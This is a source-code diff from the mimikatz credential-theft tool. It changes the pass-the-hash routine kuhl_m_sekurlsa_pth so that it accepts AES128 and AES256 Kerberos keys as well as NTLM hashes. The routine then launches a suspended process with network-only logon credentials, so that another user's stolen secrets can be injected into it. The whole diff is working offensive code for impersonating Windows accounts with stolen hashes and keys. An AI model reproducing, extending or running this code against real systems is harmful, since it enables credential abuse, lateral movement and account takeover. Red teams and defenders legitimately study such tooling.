@@ -422,10 +422,10 @@ NTSTATUS kuhl_m_sekurlsa_getLogonData(const PKUHL_M_SEKURLSA_PACKAGE * lsassPack
 
 NTSTATUS kuhl_m_sekurlsa_pth(int argc, wchar_t * argv[])
 {
-	BYTE ntlm[LM_NTLM_HASH_LENGTH];
+	BYTE ntlm[LM_NTLM_HASH_LENGTH], aes128key[AES_128_KEY_LENGTH], aes256key[AES_256_KEY_LENGTH];
 	TOKEN_STATISTICS tokenStats;
-	SEKURLSA_PTH_DATA data = {&(tokenStats.AuthenticationId), NULL, NULL, ntlm, FALSE};
-	PCWCHAR szRun, szNTLM;
+	SEKURLSA_PTH_DATA data = {&(tokenStats.AuthenticationId), NULL, NULL, ntlm, NULL, NULL, FALSE};
+	PCWCHAR szRun, szNTLM, szAes128, szAes256;
 	DWORD dwNeededSize;
 	HANDLE hToken;
 	PROCESS_INFORMATION processInfos;
@@ -436,11 +436,42 @@ NTSTATUS kuhl_m_sekurlsa_pth(int argc, wchar_t * argv[])
 		{
 			if(kull_m_string_args_byName(argc, argv, L"ntlm", &szNTLM, NULL))
 			{
-				if(kull_m_string_stringToHex(szNTLM, ntlm, sizeof(ntlm)))
+				if(kull_m_string_stringToHex(szNTLM, ntlm, LM_NTLM_HASH_LENGTH))
 				{
 					kull_m_string_args_byName(argc, argv, L"run", &szRun, L"cmd.exe");
 					kprintf(L"user\t: %s\ndomain\t: %s\nNTLM\t: ", data.UserName, data.LogonDomain);
 					kull_m_string_wprintf_hex(data.NtlmHash, LM_NTLM_HASH_LENGTH, 0); kprintf(L"\n");
+
+					if(kull_m_string_args_byName(argc, argv, L"aes128", &szAes128, NULL))
+					{
+						if(MIMIKATZ_NT_BUILD_NUMBER > KULL_M_WIN_MIN_BUILD_BLUE)
+						{
+							if(kull_m_string_stringToHex(szAes128, aes128key, AES_128_KEY_LENGTH))
+							{
+								data.Aes128Key = aes128key;
+								kprintf(L"AES128\t: ");
+								kull_m_string_wprintf_hex(data.Aes128Key, AES_128_KEY_LENGTH, 0); kprintf(L"\n");
+							}
+							else PRINT_ERROR(L"AES128 hash length must be 32 (16 bytes)\n");
+						}
+						else PRINT_ERROR(L"AES128 key only supported from Windows 8.1\n");
+					}
+
+					if(kull_m_string_args_byName(argc, argv, L"aes256", &szAes256, NULL))
+					{
+						if(MIMIKATZ_NT_BUILD_NUMBER > KULL_M_WIN_MIN_BUILD_BLUE)
+						{
+							if(kull_m_string_stringToHex(szAes256, aes256key, AES_256_KEY_LENGTH))
+							{
+								data.Aes256Key = aes256key;
+								kprintf(L"AES256\t: ");
+								kull_m_string_wprintf_hex(data.Aes256Key, AES_256_KEY_LENGTH, 0); kprintf(L"\n");
+							}
+							else PRINT_ERROR(L"AES256 hash length must be 64 (32 bytes)\n");
+						}
+						else PRINT_ERROR(L"AES256 key only supported from Windows 8.1\n");
+					}
+
 					kprintf(L"Program\t: %s\n", szRun);
 					if(kull_m_process_create(KULL_M_PROCESS_CREATE_LOGON, szRun, CREATE_SUSPENDED, NULL, LOGON_NETCREDENTIALS_ONLY, data.UserName, data.LogonDomain, L"", &processInfos, FALSE))
 					{
